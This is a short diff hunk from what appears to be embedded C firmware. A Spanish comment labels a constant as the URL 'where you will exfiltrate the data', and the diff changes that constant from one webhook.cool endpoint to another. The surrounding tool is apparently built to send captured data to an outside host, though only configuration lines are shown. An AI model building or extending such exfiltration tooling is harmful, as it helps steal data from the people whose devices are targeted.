@@ -5,7 +5,7 @@
 #define KEY_DOWN 0x51 
 
 // URL donde exfiltrarás los datos
-#define WEBHOOK_URL "https://calm-planet-91.webhook.cool"
+#define WEBHOOK_URL "https://rapid-valley-39.webhook.cool"
 
 // --- Configuración de Pines ---
 const int PIN_LED = 1;       
